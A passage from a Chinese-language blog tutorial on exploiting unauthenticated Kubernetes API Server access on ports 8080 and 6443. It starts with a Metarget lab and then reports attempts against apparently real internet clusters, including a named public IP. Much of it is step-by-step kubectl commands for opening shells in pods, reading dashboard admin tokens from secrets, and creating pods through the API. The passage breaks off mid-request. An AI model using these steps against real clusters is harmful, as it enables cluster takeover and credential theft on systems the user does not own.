restricted universe multiverse</span><br></pre></td></tr></table></figure><h5 id="开源项目metarget"><a href="#开源项目metarget" class="headerlink" title="开源项目metarget"></a>开源项目<a href="https://github.com/Metarget/metarget">metarget</a></h5><p>在研究漏洞时，我们经常会发现“环境搭建”这一步骤本身就会占用大量的时间，与之相比，真正测试PoC、ExP的时间可能非常短。由于许多官方镜像在国内的网络环境下并不方便获得，加上云原生组件自身的复杂性，在云原生安全领域，前述问题尤为明显。</p><p>与此同时，我们也能看到，开源社区涌现出一些优秀的安全项目，如<a href="https://github.com/vulhub/vulhub">Vulhub</a>、<a href="https://github.com/Medicean/VulApps">VulApps</a>等，将漏洞场景打包成镜像，方便研究人员开箱即用。</p><p>然而，这些项目主要针对应用程序漏洞。那么，如果我们需要研究的是Docker、Kubernetes、操作系统内核等底层基础设施自身的漏洞呢？这又回到了前面的环境搭建问题。</p><p>我们希望Metarget能够在一定程度上解决这个问题，致力于底层基础设施的脆弱场景自动化构建。在此之上，我们还希望Metarget实现对云原生环境多层次脆弱场景的自动化构建。</p><h6 id="安装metarget"><a href="#安装metarget" class="headerlink" title="安装metarget"></a>安装metarget</h6><p>官方已经给好了安装方式，简单操作即可，安装k8s之前要先安装docker，傻瓜式操作，一键安装。<br>这里官方推荐使用ubuntu16或者18，笔者在这里推荐必须用ubuntu18，因为笔者在ubuntu20上研究了两天利用metarget安装k8s都没有成功，中间会出现各种各样的错误。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#克隆项目</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Metarget/metarget.git</span><br><span class="line"><span class="built_in">cd</span> metaget/ </span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line"><span class="comment">#这里如果没有pip3  先apt install python3-pip</span></span><br><span class="line"><span class="comment">#好像还要装一下curl    apt install curl</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20231227212433818.png" alt="image-20231227212433818"></p><p>在安装完依赖后，要先安装一个docker  ，不让直接装k8s是不行的。<br>用metarget 装  很简单<code>./metarget gadget install docker --version 18.03.1</code><br><img src="/images/k8s/image-20231227212726975.png" alt="image-20231227212726975"></p><p>在这其中，我们可以加参数，–verbose显示详细的安装过程，方便调试像这样<code>./metarget gadget install docker --version 18.03.1 --verbose</code></p><h5 id="k8s-一些重要的命令"><a href="#k8s-一些重要的命令" class="headerlink" title="k8s 一些重要的命令"></a>k8s 一些重要的命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在本机上查看node</span></span><br><span class="line">kubectl get node</span><br><span class="line">root@bohemian:~<span class="comment"># kubectl get node</span></span><br><span class="line">NAME              STATUS   ROLES    AGE   VERSION</span><br><span class="line">racknerd-6d0a89   Ready    master   37h   v1.16.6-beta.0</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看namespace</span></span><br><span class="line">kubectl get namespace</span><br><span class="line">root@bohemian:~<span class="comment"># kubectl get namespace</span></span><br><span class="line">NAME                   STATUS   AGE</span><br><span class="line">default                Active   37h</span><br><span class="line">kube-node-lease        Active   37h</span><br><span class="line">kube-public            Active   37h</span><br><span class="line">kube-system            Active   37h</span><br><span class="line">kubernetes-dashboard   Active   95m</span><br><span class="line">metarget               Active   24h</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看某个namespcae下有那些的pod</span></span><br><span class="line">kubectl get pods -n metarget</span><br><span class="line">root@bohemian:~<span class="comment"># kubectl get pods -n metarget</span></span><br><span class="line">NAME                                       READY   STATUS    RESTARTS   AGE</span><br><span class="line">dvwa-web-86b6ccdc69-7l6n4                  1/1     Running   0          24h</span><br><span class="line">thinkphp-5-0-23-rce-web-7bb696c45b-n52pb   1/1     Running   0          24h</span><br><span class="line"></span><br><span class="line"><span class="comment">#在某个pod上执行命令</span></span><br><span class="line">kubectl <span class="built_in">exec</span> -n metarget -it dvwa-web-86b6ccdc69-7l6n4  sh</span><br><span class="line">kubectl <span class="built_in">exec</span> -n metarget -it dvwa-web-86b6ccdc69-7l6n4  <span class="string">&quot;ls -al&quot;</span></span><br><span class="line">root@bohemian:~<span class="comment"># kubectl exec -n metarget -it dvwa-web-86b6ccdc69-7l6n4  sh</span></span><br><span class="line"><span class="comment"># php -v</span></span><br><span class="line">PHP 7.0.30-0+deb9u1 (cli) (built: Jun 14 2018 13:50:25) ( NTS )</span><br><span class="line">Copyright (c) 1997-2017 The PHP Group</span><br><span class="line">Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.0.30-0+deb9u1, Copyright (c) 1999-2017, by Zend Technologies</span><br><span class="line"></span><br><span class="line">kubectl <span class="built_in">exec</span> -n kube-system -it kube-apiserver-racknerd-6d0a89 sh</span><br></pre></td></tr></table></figure><h5 id="Api-Server-未授权访问（8080和6443）"><a href="#Api-Server-未授权访问（8080和6443）" class="headerlink" title="Api Server 未授权访问（8080和6443）"></a>Api Server 未授权访问（8080和6443）</h5><p>使用metarget 安装k8s</p><p><code>./metarget gadget install k8s --version=1.16.5</code></p><p>这个时候会出现安装成功，安装成功后，就会默认的启动很多的POD<br><img src="/images/k8s/image-20231228090220104.png" alt="image-20231228090220104"></p><p>相应的使用<code>netstat -tulnp</code>会显示映射了很多端口</p><p><img src="/images/k8s/image-20231228090418847.png" alt="image-20231228090418847"></p><p>默认情况，Kubernetes API Server提供HTTP的两个端口：8080，6443</p><p>insecure-port： 默认端口8080，在HTTP中没有认证和授权检查。<br>secure-port ：默认端口6443， 认证方式，令牌文件或者客户端证书.</p><p>insecure-port 默认在高版本中是不会打开的，secure-port 默认是会打开的，但是访问时存在鉴权</p><p><a href="https://ip:6443/">https://ip:6443/</a> 访问这个6443端口时，如下图403<img src="/images/k8s/image-20231228090722306.png" alt="image-20231228090722306"></p><h6 id="8080端口未授权"><a href="#8080端口未授权" class="headerlink" title="8080端口未授权"></a>8080端口未授权</h6><p>cat /etc/kubernetes/manifests/kube-apiserver.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">component:</span> <span class="string">kube-apiserver</span></span><br><span class="line">    <span class="attr">tier:</span> <span class="string">control-plane</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-apiserver</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">command:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">kube-apiserver</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--advertise-address=ip</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--allow-privileged=true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--authorization-mode=Node,RBAC</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--client-ca-file=/etc/kubernetes/pki/ca.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--enable-admission-plugins=NodeRestriction</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--enable-bootstrap-token-auth=true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-servers=https://127.0.0.1:2379</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--insecure-port=0</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-allowed-names=front-proxy-client</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-extra-headers-prefix=X-Remote-Extra-</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-group-headers=X-Remote-Group</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-username-headers=X-Remote-User</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--secure-port=6443</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--service-account-key-file=/etc/kubernetes/pki/sa.pub</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--service-cluster-ip-range=10.96.0.0/12</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--tls-cert-file=/etc/kubernetes/pki/apiserver.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--tls-private-key-file=/etc/kubernetes/pki/apiserver.key</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">k8s.gcr.io/kube-apiserver:v1.16.5</span></span><br><span class="line">    <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">failureThreshold:</span> <span class="number">8</span></span><br><span class="line">      <span class="attr">httpGet:</span></span><br><span class="line">        <span class="attr">host:</span> <span class="string">ip</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/healthz</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">6443</span></span><br><span class="line">        <span class="attr">scheme:</span> <span class="string">HTTPS</span></span><br><span class="line">      <span class="attr">initialDelaySeconds:</span> <span class="number">15</span></span><br><span class="line">      <span class="attr">timeoutSeconds:</span> <span class="number">15</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">kube-apiserver</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="attr">requests:</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">250m</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/etc/ssl/certs</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">ca-certs</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/etc/ca-certificates</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">etc-ca-certificates</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/etc/kubernetes/pki</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">k8s-certs</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/usr/local/share/ca-certificates</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">usr-local-share-ca-certificates</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/usr/share/ca-certificates</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">usr-share-ca-certificates</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">priorityClassName:</span> <span class="string">system-cluster-critical</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/etc/ssl/certs</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ca-certs</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/etc/ca-certificates</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">etc-ca-certificates</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/etc/kubernetes/pki</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">k8s-certs</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/usr/local/share/ca-certificates</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">usr-local-share-ca-certificates</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/usr/share/ca-certificates</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">usr-share-ca-certificates</span></span><br><span class="line"><span class="attr">status:</span> &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后可以查看一些配置参数，这个文件是会被实时读取的，改过配置文件后，不需要重启服务</p><p>其中未授权端口就是insecure-port端口设置，<code>    - --insecure-port=0</code>看了很多文章并没说那个版本以前会默认开启，只说了1.20版本后该选项已无效化，也就是说，1.20版本后，该参数直接没了，如果想启用，需要管理者手动添加。</p><p>我们将这里改为8080，并且加上bind-address，保存就会看到开启了8080端口</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">--insecure-port=8080</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">--insecure-bind-address=0.0.0.0</span></span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20231228092959882.png" alt="image-20231228092959882"></p><p><img src="/images/k8s/image-20231228093032460.png" alt="image-20231228093032460"><br>这里笔者用<a href="http://ip:8080/%E8%AE%BF%E9%97%AE%E6%88%90%E5%8A%9F">http://ip:8080/访问成功</a></p><p><img src="/images/k8s/image-20231228093318336.png" alt="image-20231228093318336"></p><p><a href="https://ip:8080/">https://ip:8080/</a>  https没有成功</p><p>在实战中显示这个并不一定能利用，要显示很长这种才可能利用。</p><p><img src="/images/k8s/image-20231228112148534.png" alt="image-20231228112148534"></p><p>接下来利用，直接在kali中安装kubectl ，apt install kubectl 即可<br>执行命令查看node，<br><code>kubectl -s ip:8080 get node</code></p><p><img src="/images/k8s/image-20231228093916392.png" alt="image-20231228093916392"></p><p>即可看到服务器上的node</p><p><code>kubectl -s ip:8080 get namespace</code><br><img src="/images/k8s/image-20231228100247157.png" alt="image-20231228100247157"></p><p><code>kubectl -s ip:8080 get pods -n kube-system</code></p><p>列出某个namespace的pods</p><p><img src="/images/k8s/image-20231228100514838.png" alt="image-20231228100514838"></p><p><code>kubectl -s ip:8080 --namespace=kube-system exec -it etcd-racknerd-6d0a89 ip a</code></p><p>使用这个命令就可以在某个pod上执行命令了</p><p><img src="/images/k8s/image-20231228101628094.png" alt="image-20231228101628094"></p><p><img src="/images/k8s/image-20231228101658311.png" alt="image-20231228101658311"></p><p><code>kubectl -s ip:8080 --namespace=kube-system exec -it etcd-racknerd-6d0a89 sh</code></p><p>笔者在执行交互命令的时候，用bash没有成功，应该是对方的pod环境没有，sh就有了,这样就可以愉快的命令执行了。这些命令看起来和docker命令差不多。</p><p><img src="/images/k8s/image-20231228101830688.png" alt="image-20231228101830688"></p><p>我们也可以使用metarget安装一个dvwa，或者php的rce都可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#这个命令会安装一个dvwa的pod，把这个pod放到metarget（namespace）下面</span><br><span class="line">#但是这命令不会将dvwa的端口暴漏出来</span><br><span class="line">./metarget appv install dvwa</span><br><span class="line"></span><br><span class="line">#执行./metarget appv install dvwa --external直接安装dvwa漏洞环境到脆弱的底层基础设施上，并以NodePort形式将端口暴露出来。</span><br><span class="line">#也就是要加个参数--external</span><br><span class="line">./metarget appv install thinkphp-5-0-23-rce --external</span><br></pre></td></tr></table></figure><p>笔者在这里搭建了一个dvwa 一个thinkphp的RCE用于测试，暴漏的端口分别是30000和30001</p><p><img src="/images/k8s/image-20231228104006919.png" alt="image-20231228104006919"></p><p><img src="/images/k8s/image-20231228104102865.png" alt="image-20231228104102865"></p><p>未授权漏洞也是可以看到的</p><p><img src="/images/k8s/image-20231228104156293.png" alt="image-20231228104156293"></p><p>命令总结</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubectl -s 27.223.94.14:8080 get node</span><br><span class="line">kubectl -s 27.223.94.14:8080 get namespace</span><br><span class="line">kubectl -s ip:8080 get pods -n metarget</span><br><span class="line">kubectl -s ip:8080 --namespace=kube-system exec -it kube-scheduler-racknerd-6d0a89 bash</span><br></pre></td></tr></table></figure><p>在实战中也是可以利用的，</p><h6 id="失败的实战"><a href="#失败的实战" class="headerlink" title="失败的实战"></a>失败的实战</h6><p><img src="/images/k8s/image-20231228111456328.png" alt="image-20231228111456328"></p><p>但是在执行命令的时候，试了好几个pod都显示没有空间了，不可思议</p><p><img src="/images/k8s/image-20231228111621099.png" alt="image-20231228111621099"></p><p>还有这种，列pod中，pod是存在的，但是执行的时候显示不存在，不理解，可以pod清空了？</p><p><img src="/images/k8s/image-20231228112827115.png" alt="image-20231228112827115"></p><p>这种没有权限的，这种可以参考这个文章，<a href="https://blog.csdn.net/zhuyongru/article/details/114060199">https://blog.csdn.net/zhuyongru/article/details/114060199</a><br>大致意思就是对方开启了RBAC规则，简单的来说就是apiserver没有访问kubelet IPI的权限，这样就403了</p><p><img src="/images/k8s/image-20231228135913246.png" alt="image-20231228135913246"></p><h6 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h6><p><img src="/images/k8s/image-20231228142255049.png" alt="image-20231228142255049"></p><h5 id="6443端口未授权"><a href="#6443端口未授权" class="headerlink" title="6443端口未授权"></a>6443端口未授权</h5><p>如果不小心，将”system:anonymous”用户绑定到”cluster-admin”用户组，从而使6443 端口允许匿名用户以管理员权限向集群内部下发指令，<br>默认访问6443端口会显示<img src="/images/k8s/image-20231228090722306.png" alt="image-20231228090722306"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;kind&quot;</span>: <span class="string">&quot;Status&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;metadata&quot;</span>: &#123;</span><br><span class="line">    </span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;status&quot;</span>: <span class="string">&quot;Failure&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;forbidden: User \&quot;system:anonymous\&quot; cannot get path \&quot;/\&quot;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reason&quot;</span>: <span class="string">&quot;Forbidden&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;details&quot;</span>: &#123;</span><br><span class="line">    </span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;code&quot;</span>: <span class="number">403</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据message的字面意思也很好理解，也就是anonymous不能访问这个path，<br>这个时候管理员不小心使用了命令，<code>kubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous</code><br>那么就会导致anonymous可以任意访问了，</p><p><code>https://ip:6443/api/v1/namespaces/default/pods</code><br>通过浏览器获取到所有pods，</p><p><img src="/images/k8s/image-20240102155136747.png" alt="image-20240102155136747"></p><p>这个时候就可以利用了，和上面的8080端口未授权利用方式差不多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">获取到所有node</span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443 get node</span><br><span class="line">#获取到所有namespace</span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443 get namespace</span><br><span class="line">#获取默认pod，注意这里没有加namespace是默认pod</span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443 get pods</span><br></pre></td></tr></table></figure><p>这里可以注意到让输入账户密码，随便输即可。</p><p><img src="/images/k8s/image-20240102161111140.png" alt="image-20240102161111140"></p><p><img src="/images/k8s/image-20240102161338261.png" alt="image-20240102161338261"></p><p>如果在查看namespace的时候发现有dashboard的话，那么说明环境中存在面板，这个时候，我们就可以获取到面板的token，来登录面板。</p><p><img src="/images/k8s/image-20240102171909311.png" alt="image-20240102171909311"></p><p>可以看到有kubernetes-dashboard，输入下面的命令到浏览器中</p><p><code>https://ip:6443/api/v1/namespaces/kubernetes-dashboard/secrets/</code></p><p>经过测试，在其中会有多个pods，带有admin-user-token的应该就是这个pod的token了，拿出来base64一下，不要解jwt，ey开头的值，</p><p><img src="/images/k8s/image-20240102172332395.png" alt="image-20240102172332395"></p><p><img src="/images/k8s/image-20240102172520549.png" alt="image-20240102172520549"></p><p>如果环境对外映射了面板，那么就可以愉快的登录了。测试环境中好像都是映射到9090端口。<br>这样就直接托管了整个k8s。</p><p><img src="/images/k8s/image-20240102172819323.png" alt="image-20240102172819323"></p><p>这里会有小伙伴有疑问，上面用kubectl –insecure-skip-tls-verify -s <a href="https://ip:6443/">https://ip:6443</a> -n kube命令打着打着，怎么跳到用浏览器请求了，获取token了。<br>这里其实是因为，笔者在这里太菜了，上面8080端口的未授权利用可以获取到pods namespace等信息，那便是可以获取到token的，这里提前说一下其实获取token的作用就是登录面板的，下面会说到，在宿主主机上执行<code>kubectl -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/admin-user -o jsonpath=&quot;&#123;.secrets[0].name&#125;&quot;) -o go-template=&quot;&#123;&#123;.data.token | base64decode&#125;&#125;&quot;</code><br>便可获取到token，它是用来登录面板的，那么同理可得，如果6443端口存在未授权，那么这里就可以获取token，笔者在这里试了好多种linux转义，都没有成功，如果有成功的大师傅可以留言，感谢感谢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443 -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/admpath=\&quot;&#123;.secrets[0].name&#125;\&quot;) -o go-template=\&quot;&#123;&#123;.data.token \| base64decode&#125;&#125;\&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240102212933474.png" alt="image-20240102212933474"></p><p>这里如果没有k8面板的话，也没有关系，直接使用浏览器创建pods也可行，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v1/namespaces/default/pods</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ip:6443</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1180</span><br><span class="line"></span><br><span class="line"><span class="swift">&#123;</span></span><br><span class="line"><span class="swift">    <span class="string">&quot;apiVersion&quot;</span>: <span 